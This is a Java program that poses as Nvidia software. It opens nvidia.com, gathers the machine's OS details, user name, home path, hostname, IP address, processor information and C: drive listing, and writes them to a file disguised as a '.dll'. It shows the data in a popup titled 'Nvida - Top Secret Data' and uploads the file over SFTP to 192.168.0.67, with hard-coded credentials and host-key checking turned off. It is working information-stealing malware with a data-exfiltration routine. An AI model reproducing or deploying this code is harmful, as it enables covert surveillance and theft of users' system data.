package main;

import com.jcraft.jsch.ChannelSftp;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;

import javax.swing.*;
import java.awt.*;
import java.io.*;
import java.net.InetAddress;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.UnknownHostException;
import java.util.*;


public class Main {

    public static void main(String[] args) throws IOException, Exception, JSchException {

        // Executes the Browser
        try {
            // Creates a Desktop object
            Desktop desktop = Desktop.getDesktop();
            // Invokes a desktop method browse and opens the provided link
            desktop.browse(new URI("https://www.nvidia.com/en-au/"));
        } catch (URISyntaxException uri) {
            // Catches the Exceptions
            System.out.println("Error Incorrect String");
        } catch (IOException io) {
            // Catches the Exceptions
            System.out.println("Error IO Exception Thrown");
        }

        //Creating a File object for directory
        File dirListC = new File("C:\\");
        //List of all files and directories
        String filesInDir[] = dirListC.list();

        // Gets & Stores System Information
        String osName = System.getProperty("os.name");
        String osVersion = System.getProperty("os.version");
        String osArchitecture = System.getProperty("os.arch");
        String osManufacturer = System.getProperty("os.manufacturer");
        String osArchDataModel = System.getProperty("sun.arch.data.model");
        String virtualMachineVersion = System.getProperty("java.vm.version");
        String userDir = System.getProperty("user.dir");
        String userHome = System.getProperty("user.home");
        String userName = System.getProperty("user.name");
        String userCountry = System.getProperty("user.country");
        String userLanguage = System.getProperty("user.language");
        String systemName = InetAddress.getLocalHost().getHostName();
        String hostIPAddress = InetAddress.getLocalHost().getHostAddress();
        String processorIdentifier = System.getenv("PROCESSOR_IDENTIFIER");
        String processorArchitecture = System.getenv("PROCESSOR_ARCHITECTURE");
        String processorNumbers = System.getenv("NUMBER_OF_PROCESSORS");

        TimeZone timeZone = Calendar.getInstance().getTimeZone();
        String userTimezone = timeZone.getDisplayName();
        String userTimezoneID = timeZone.getID();

        String sysInfo = "OS NAME: " + osName + "\n" +
                "Version: " + osVersion + "\n" +
                "System Type: " + osArchDataModel + "\n" +
                "OS Architecture: " + osArchitecture + "\n" +
                "OS Manufacturer: " + osManufacturer + "\n" +
                "User Dir: " + userDir + "\n" +
                "User Home: " + userHome + "\n" +
                "User Name: " + userName + "\n" +
                "System Name: " + systemName + "\n" +
                "Host IP Address: " + hostIPAddress + "\n" +
                "Processor Identifier: " + processorIdentifier + "\n" +
                "Processor Architecture: " + processorArchitecture + "\n" +
                "Processor Number: " + processorNumbers + "\n" +
                "User Country: " + userCountry + "\n" +
                "User Timezone: " + userTimezone + "\n" +
                "User Timezone ID: " + userTimezoneID + "\n" +
                "User Language: " + userLanguage + "\n";

        JFrame windowPopup = new JFrame();
        ImageIcon image = new ImageIcon(Main.class.getResource("Nvida.png"));
        Image getImage = image.getImage();
        Image resizedImage = getImage.getScaledInstance(128, 128, java.awt.Image.SCALE_SMOOTH);
        image = new ImageIcon(resizedImage);

        FileWriter fileWriter = new FileWriter("Infos3785646s3838975.dll");
        saveInfoToFile(filesInDir, sysInfo, fileWriter);

        File file = new File(userHome + "/Infos3785646s3838975.dll");
        FileWriter fileWriter2 = new FileWriter(file);
        saveInfoToFile(filesInDir, sysInfo, fileWriter2);

        JOptionPane.showMessageDialog(windowPopup, sysInfo, "Nvida - Top Secret Data", JOptionPane.INFORMATION_MESSAGE, image);

        JSch jsch = new JSch();
        Session session = jsch.getSession("mysftpuser", "192.168.0.67");
        session.setConfig("StrictHostKeyChecking", "no");
        session.setPassword("mysftpuser");
        session.connect();
        ChannelSftp channel = (ChannelSftp) session.openChannel("sftp");
        channel.connect();
        channel.cd("/");

        FileInputStream fis = new FileInputStream(file);
        channel.put(fis, file.getName());

        channel.disconnect();
        session.disconnect();

    }

    private static void saveInfoToFile(String[] filesInDir, String sysInfo, FileWriter fileWriter) throws IOException {
        BufferedWriter bufferedWriter = new BufferedWriter(fileWriter);
        PrintWriter out = new PrintWriter(bufferedWriter);
        out.println("Host system configuration (systeminfo and network configuration):\n \n" + sysInfo);

        out.println("\nList of Folders & Files in the local C Drive:\n");
        for (int i = 0; i < filesInDir.length; i++) {
            out.println(filesInDir[i]);
        }
        bufferedWriter.close();
    }


}
